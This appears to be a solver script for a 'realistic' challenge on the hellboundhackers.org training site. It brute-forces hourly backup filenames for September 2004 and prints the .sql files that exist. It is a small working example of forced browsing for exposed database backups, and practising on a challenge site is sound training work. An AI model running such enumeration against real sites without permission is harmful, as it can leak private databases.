import requests
url = "https://www.hellboundhackers.org/challenges/real2/backups/backup_2004-09-"
day = 1
newUrl = ""

while day <= 30:
    if day < 10:
        for i in range(0,10):
            newUrl = url+"0"+str(day)+"_0"+str(i)+"00.sql"
            if requests.get(newUrl).status_code == 200:
                print(newUrl)
        for i in range(10,24):
            newUrl = url+"0"+str(day)+"_"+str(i)+"00.sql"
            if requests.get(newUrl).status_code == 200:
                print(newUrl)
    else:
        for i in range(0,10):
            newUrl = url+str(day)+"_0"+str(i)+"00.sql"
            if requests.get(newUrl).status_code == 200:
                print(newUrl)
        for i in range(10,24):
            newUrl = url+str(day)+"_"+str(i)+"00.sql"
            if requests.get(newUrl).status_code == 200:
                print(newUrl)
    day += 1